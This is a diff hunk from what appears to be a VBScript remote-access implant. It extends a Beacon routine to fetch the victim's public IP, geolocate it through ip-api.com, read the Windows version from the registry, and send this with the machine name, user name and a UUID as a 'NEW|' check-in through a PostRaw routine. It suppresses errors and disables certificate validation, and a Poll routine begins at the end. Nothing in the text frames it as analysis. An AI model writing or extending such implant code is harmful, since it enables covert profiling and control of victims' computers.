@@ -56,15 +56,25 @@ Function Decode(b64)
 End Function
 
 Sub Beacon()
-    Dim ip
     On Error Resume Next
-    Dim xh: Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+    Dim ip, geo, osver, xh, ll
+    Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
     xh.SetOption 2, 13056
     xh.Open "GET", "https://api.ipify.org/", False
     xh.Send
     If xh.Status = 200 Then ip = xh.responseText Else ip = "unknown"
+    geo = "unknown"
+    If Len(ip) > 6 Then
+        xh.Open "GET", "http://ip-api.com/line/" & ip & "?fields=country,regionName,city,isp", False
+        xh.Send
+        If xh.Status = 200 Then
+            ll = Split(xh.responseText, vbLf)
+            If UBound(ll) >= 3 Then geo = ll(0) & ", " & ll(2) & " (" & ll(3) & ")"
+        End If
+    End If
+    osver = sh.RegRead("HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductName") & " " & sh.RegRead("HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\DisplayVersion")
     Set xh = Nothing
-    PostRaw "NEW|" & uuid & "|" & PC & "|" & USER & "|" & ip
+    PostRaw "NEW|" & uuid & "|" & PC & "|" & USER & "|" & ip & "|" & osver & "|" & geo
 End Sub
 Sub Poll()
     On Error Resume Next
